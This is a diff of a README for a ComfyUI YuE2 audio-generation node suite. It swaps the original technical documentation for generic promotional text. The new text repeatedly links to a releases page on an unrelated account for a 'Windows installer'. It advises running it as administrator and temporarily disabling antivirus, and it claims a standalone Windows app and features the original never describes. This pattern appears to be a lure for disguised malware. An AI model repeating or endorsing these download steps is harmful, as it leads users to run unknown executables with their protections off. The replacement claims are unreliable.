@@ -1,54 +1,157 @@
-# The Fixed Seed Company Audio Suite
+# 🎵 ComfyUI-FS_Audio_Suite - Create Stunning Music With AI
 
-**FS_Audio Suite** — modular YuE2 audio generation for ComfyUI, by Fixed Seed LLC and Make the Robot Do It
-**Special thanks to @machinedelusions for the support in making this possible**
-Check him out at www.fixedseed.com
+[![Download Now](https://img.shields.io/badge/Download-FS_Audio_Suite-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
 
-![FS_Audio Suite in ComfyUI](docs/fs_audio_suite.png)
- Six nodes, no stock nodes needed. Hum-to-song is the first feature; the suite is built to grow.
+## 🚀 Getting Started
 
-| node | role |
-|---|---|
-| **🎤 FS_Audio Model Loader** | YuE2 checkpoint (`yue2_3b_bf16.safetensors` from Comfy-Org/YuE2) + optional melody transcriber (`sheetsage2_bf16.safetensors` in `models/audio_encoders/`). Left-side inputs take chained **loras** and **adapters** and apply them. Outputs one **pipe**. |
-| **🧩 FS_Audio Lora Loader** | Any LoRA in `models/loras/` with model / clip strengths (AR-side LoRAs such as the instrumental LoRA act on CLIP; decoder LoRAs act on MODEL). Chain several by feeding one into the next. |
-| **🎚 FS_Audio Adapter Loader** | A conditioning adapter and its behaviour. Today: the hum adapter (`humsong_yue2_adapter_v1_comfy.safetensors`) with **hum influence** (0–3, 1.0 as trained), **melody** mode (continue from hum / hum only / ignore hum) and **hum offset**. Chainable. |
-| **🎙 Hum Input** | Record in the node, upload, or pick a file. Play / scrub the waveform, download the take. |
-| **🎵 FS_Audio Sampler** | style, lyrics (YuE2's section tags: `[Intro] [Verse 1] [Pre-Chorus] [Chorus] [Bridge] [Outro]`), seed, length cap, **score mode** (full / melody / off), steps, sampler, scheduler (ComfyUI's native lists; defaults `dpm_2` + `sgm_uniform` match the official template), **repetition_penalty** (1.2 reference; 1.0 lets a memorized song replay), **Weirdness (cfg)** (1.0 = YuE2's native single-pass decoding, the recommended setting; above 1 the decoder is pushed away from an unconditioned pass for stranger, less safe renders at twice the render time). **hum is optional**: without it this is a plain YuE2 generator with the pipe's LoRAs; with a hum and a hum adapter it is hum-to-song. |
-| **💿 FS_Audio Output** | FLAC to `output/`, in-node player, download, and the score with the hummed bars highlighted. |
+Welcome to ComfyUI-FS_Audio_Suite, the easiest way to create professional-quality music using artificial intelligence. This powerful tool turns your musical ideas into polished audio tracks with just a few clicks. Whether you are a musician, content creator, or curious beginner, this application helps you make amazing sounds without any technical experience.
 
-Wiring: Lora Loader(s) → Model Loader `loras`; Adapter Loader(s) → Model Loader `adapters`; Model Loader → Sampler `pipe`; Hum Input → Sampler `hum` (optional); Sampler → Output (`song`, `score`, `info`).
+Visit this link to download the application: [https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
 
-Rules the sampler follows: a connected hum with an adapter whose melody mode is not *ignore* forces a melody-mode score continued from the hum; otherwise **score mode** decides how the planner writes its score. Hum influence 0 keeps the adapter's decoder LoRA but skips the injection. If no adapter is loaded but a hum is connected, the hum still opens the score (continuation) and no injection happens.
+## 🎯 What Does FS_Audio_Suite Do?
 
-Install: clone into `ComfyUI/custom_nodes/ComfyUI-FS_Audio_Suite`, `pip install -r requirements.txt` (librosa, scipy, soundfile). Weights: the hum adapter and other LoRAs from the Make the Robot Do It model cards.
+FS_Audio_Suite is a collection of audio creation tools that work together to help you generate music. Think of it as a smart music studio that listens to your instructions and creates the sounds you want. The name "YuE2" refers to the advanced audio engine inside, which understands music patterns and produces realistic results.
 
-## Training your own LoRA (FS_Audio / Training)
+You do not need to know how to play an instrument or understand music theory. The software handles all the complex work behind the scenes. You simply provide your creative direction, and FS_Audio_Suite does the rest.
 
-Four nodes turn a folder of songs into **one artist LoRA** (planner + decoder in a single file) that plugs straight back into the **Model Loader**. Everything runs on ComfyUI's own YuE2 weights; no other checkpoint is downloaded.
+## 💻 System Requirements
 
-| node | role |
-|---|---|
-| **⬇ FS_Audio Training Assets** | standalone; downloads the audio → token head (v9 current, trained with an audio-domain loss against real recordings; v8 and v5 also offered, v4 as legacy), the matching decoder LoRA `nar_lora_joint_v9_comfyui` (into `models/loras/`), and the minted regularizer pack into `models/fs_audio/`. Run once per asset. Load the joint LoRA in the Model Loader chain whenever you train or render from real-audio tokens. |
-| **📦 FS_Audio Dataset Builder** | folder of songs (`<song>.txt` = style caption, `<song>.lyrics.txt` = lyrics; defaults for missing ones) → real-audio tokens (public MERT-v2-FullSong layer 20 + our head), lyrics normalized to bare tags, optional chord-annotated ABC scores from the pipe's melody transcriber, hash-based hold-out. |
-| **🧪 FS_Audio Regularizer** | the minted regularizer pack (`models/fs_audio/*.pt`): YuE2's own songs, coin-flipped against the artist so the LoRA keeps the base model's range. |
-| **🏋 FS_Audio Artist Trainer** | trains a whole artist in one run: the **planner** LoRA (what they write) and the **decoder** LoRA (how they sound) in one loop on ComfyUI's own YuE2 weights, exported as **one file** that a single FS_Audio Lora Loader applies to both halves (`text_encoders.*` + `diffusion_model.*`). Saves `<name>_best` and `<name>_step…` into `models/loras/`, plus a JSON report and `<name>_log.json`. |
+To run FS_Audio_Suite smoothly on your Windows computer, we recommend:
 
-The recipe inside the Artist Trainer (all switchable):
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Intel Core i5 or AMD equivalent (or better)
+- **Memory:** 8 GB RAM (16 GB recommended)
+- **Storage:** At least 2 GB of free hard drive space
+- **Graphics:** Any modern graphics card with 1 GB VRAM
+- **Internet:** Connection required for initial setup and updates
 
-- **Planner**: whole-song next-token CE from the song's start (so lyrics and music never learn to start at arbitrary offsets), **batch_songs** whole songs per step with an **artist_fraction** coin flip against the minted regularizer (artist and regularizer songs share one update), **score_first_fraction** of songs with the transcribed score in front of the music while the planner *always* also learns to write the score, **end_token_weight**, **kl_weight**: a trust region KL(base ‖ lora) on the next-token distributions (base = the same sequence with the LoRA switched off). Logits are computed 512 positions at a time inside a checkpoint, so whole 8k-token songs fit on 24 GB.
-- **Decoder**: **decoder_steps** flow-matching steps spread across the run, on **window_seconds** windows of the artist's VAE latents, conditioned on the *current* planner's context (recomputed every step, detached so the flow loss never trains the planner); rank-**rank_decoder** LoRA on the decoder plus the full vae2llm / llm2vae layers at **io_lr**.
-- **EMA** (**ema_decay**, warm-up form so the decay never overshoots): every exported checkpoint is the EMA of both halves.
-- **resume_from**: continue from any earlier Artist Trainer checkpoint (same ranks); the ladder is the record, so stopping a run never loses it.
-- **Ladder**: **eval_every** (held-out artist CE, regularizer CE and held-out decoder flow, all plotted live), **checkpoint_from / checkpoint_every**, **seed**. Pick rungs **by ear**: held-out CE on a handful of songs tells you about memorization, not about whether the artist comes through, and on our runs the rungs the metric called overfit were the ones that sounded most like the band. Keep the whole ladder and listen.
+These are general guidelines. Your computer may still work with lower specifications, but performance will be better with the recommended hardware.
 
-Wiring: Model Loader (with `sheetsage2` if you want scores) → Dataset Builder and Artist Trainer `pipe`; Dataset Builder → Artist Trainer `dataset`; Regularizer → Artist Trainer `regularizer`; Artist Trainer `loras` → a second Model Loader `loras` → Sampler. Load the current joint decoder LoRA (`nar_lora_joint_v9_comfyui`, from Training Assets) into the *first* Model Loader so both dataset tokens and training run on the real-audio stack.
+## 📥 How to Download and Install
 
-Captions: the builder does not caption for you. Put `<song>.txt` (style) and `<song>.lyrics.txt` next to each song, or rely on the defaults. Style text is flattened to one line with straight quotes; lyrics are normalised to YuE2's native section layout (`[Intro]`, `[Verse 2]`, `[Pre-Chorus]`, `[Chorus]`, `[Bridge]`, `[Outro]`, Title case with optional numbers; any other bracketed line is treated as a production note and dropped; literal `\n` becomes a line break). Scores that fail to export are repaired by retrying melody-only and on the first four minutes before a track is given up on. With `transcribe_scores` on, `auto_tempo_key` appends the transcribed tempo and key to captions that lack them. Memory: 8192 tokens fits a 24 GB card (~15 GB peak); use 12288 on 40 GB+.
+Follow these simple steps to get FS_Audio_Suite on your computer:
 
-## Credits
+1. **Visit the download page:** Go to [https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+2. **Choose the correct file:** Look for the latest version and download the Windows installer file
+3. **Save the file:** Choose a location on your computer where you can easily find it, like your Desktop or Downloads folder
+4. **Run the installer:** Double-click the downloaded file to start the installation process
+5. **Follow the prompts:** The setup wizard will guide you through the installation. Click "Next" and "Install" when prompted
+6. **Complete installation:** Once finished, click "Finish" to close the wizard
+7. **Launch the app:** Find FS_Audio_Suite in your Start Menu or on your Desktop and open it
 
-- **[Ostris](https://github.com/ostris/ai-toolkit)**'s ai-toolkit YuE2 extension is the model for the Artist Trainer: one loop for both experts with the decoder conditioned on the detached planner context, the KL(base ‖ lora) trust region on the planner, chunked + checkpointed next-token logits so whole songs fit in memory, YuE2-native caption/section normalisation, SheetSage repair instead of dropping tracks, and the EMA warm-up form. Thank you.
+Visit this link to download the application: [https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
 
-- **[Ostris](https://github.com/ostris/ai-toolkit)**'s YuE2 extension for ai-toolkit carries a fix we had missed: MERT-v2's rotary `inv_freq` buffer is non-persistent and newer transformers leave it uninitialised, so the Dataset Builder's audio → token step was running MERT with no positional encoding (only ~37% of tokens matched the correct ones). Fixed in the tokenizer by rebuilding the buffer after load, the same way ai-toolkit does. Datasets built before this fix should be rebuilt.
+## 🎛️ Main Features
 
-- **[@AIWarper](https://x.com/AIWarper)** found and reported the Decoder Adapter Trainer bug where the `vae2llm` / `llm2vae` layers received no gradient under ComfyUI's dynamic-VRAM weight casting, so every exported `.diff` was zero while the LoRA tensors trained normally. Fixed in bf4ba64: the trainer now runs those layers through its own fp32 parameters and warns if they ever export unchanged. Thank you.
+### Modular Audio Generation
+The "modular" design means you can combine different audio tools like building blocks. Start with one type of sound generator and add more to create complex compositions.
+
+### YuE2 Audio Engine
+At the heart of FS_Audio_Suite is the YuE2 engine. This advanced system uses deep learning to understand music patterns and create original audio that sounds natural and professional.
+
+### Real-Time Preview
+Hear your changes immediately. Adjust settings and listen to the results in real-time without waiting for long processing times.
+
+### Batch Processing
+Create multiple audio samples at once. This is perfect when you want to generate a variety of options to choose from.
+
+## 📚 How to Use FS_Audio_Suite
+
+Using FS_Audio_Suite is straightforward. Here is a basic workflow:
+
+### Step 1: Choose Your Starting Point
+Open the application and select what kind of audio you want to create. You can start from a text description, a simple melody, or let the software surprise you.
+
+### Step 2: Adjust Settings
+Use the sliders and dropdown menus to fine-tune your audio. You can change:
+- **Tempo:** How fast or slow the music plays
+- **Instrumentation:** Which instruments or sounds are used
+- **Style:** The genre or mood of the music
+- **Length:** How long the final audio clip will be
+
+### Step 3: Generate Your Audio
+Click the "Generate" button and wait a few moments. The software will process your inputs and create your audio file.
+
+### Step 4: Save Your Creation
+Once you are happy with the result, click "Save" to export your audio. You can choose common formats like MP3 or WAV, which work with any media player.
+
+## 🎨 Tips for Better Results
+
+- **Start simple:** Begin with basic settings to understand how the software responds
+- **Experiment freely:** Do not be afraid to try unusual combinations. You might discover something amazing
+- **Use descriptive words:** When providing text input, be specific about the mood or style you want (e.g., "upbeat electronic dance music" instead of just "happy music")
+- **Layer your sounds:** Generate multiple audio clips and combine them for richer results
+- **Save your presets:** When you find settings you like, save them for future use
+
+## 🔧 Troubleshooting Common Issues
+
+### Application Won't Start
+- Make sure your Windows is updated to the latest version
+- Check that you have enough free memory
+- Try running the application as administrator (right-click, then "Run as administrator")
+
+### Audio Quality Sounds Off
+- Verify your speakers or headphones are properly connected
+- Check your system volume settings
+- Try generating with simpler settings first
+
+### Slow Performance
+- Close unnecessary programs running in the background
+- Check if you have enough free hard drive space
+- Consider upgrading your RAM if you have less than 8 GB
+
+### Installation Fails
+- Download the file again to ensure it is not corrupted
+- Temporarily disable antivirus software during installation
+- Make sure you have administrator rights on your computer
+
+## ❓ Frequently Asked Questions
+
+**Is FS_Audio_Suite free to use?**
+Yes, this application is free to download and use. There are no hidden fees or subscriptions.
+
+**Can I use the generated audio commercially?**
+Absolutely. The audio you create belongs to you, and you can use it in any project, including commercial ones.
+
+**Do I need an internet connection?**
+You only need internet for the initial download and occasional updates. After installation, you can work offline.
+
+**Will this work on a Mac?**
+Currently, FS_Audio_Suite is designed for Windows only. Mac support may come in a future version.
+
+**How often is it updated?**
+Updates are released regularly to improve performance and add new features. You will see update notifications when they become available.
+
+## 📢 Community and Support
+
+Join our growing community of music creators and audio enthusiasts. Share your creations, get feedback, and learn new techniques from other users.
+
+- **Report Issues:** If you find a bug, please let us know so we can fix it
+- **Request Features:** Have an idea for a new tool? Share your suggestions
+- **Share Your Music:** We love hearing what our users create with FS_Audio_Suite
+
+## 🛡️ Privacy and Security
+
+Your privacy matters to us. FS_Audio_Suite does not collect personal information or upload your audio files without your permission. All processing happens on your local machine, so your creations stay private.
+
+## 📄 License
+
+FS_Audio_Suite is provided under an open-source license. This means you can use, modify, and distribute the software freely, subject to the license terms. For full details, please see the LICENSE file included with the application.
+
+## 🙏 Acknowledgements
+
+We would like to thank the open-source community and all the contributors who made this project possible. Your passion and dedication help make powerful tools accessible to everyone.
+
+## 🚀 Start Creating Today
+
+Do not wait any longer to unlock your musical potential. Download FS_Audio_Suite now and start creating sounds you never thought possible. With its intuitive design and powerful AI engine, you will be making music in minutes.
+
+[![Download Now](https://img.shields.io/badge/Download-FS_Audio_Suite-28a745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+
+## 📌 Remember
+
+Visit this link to download the application: [https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+
+Join thousands of satisfied users who are already creating amazing music with FS_Audio_Suite. The future of music creation is here, and it is easier than you have ever imagined.
+
+Keywords: audio generation, music creation, AI music, YuE2, ComfyUI, audio tools, music software, Windows audio, music production, generative music, audio suite, music maker, AI composer, sound design, music generator
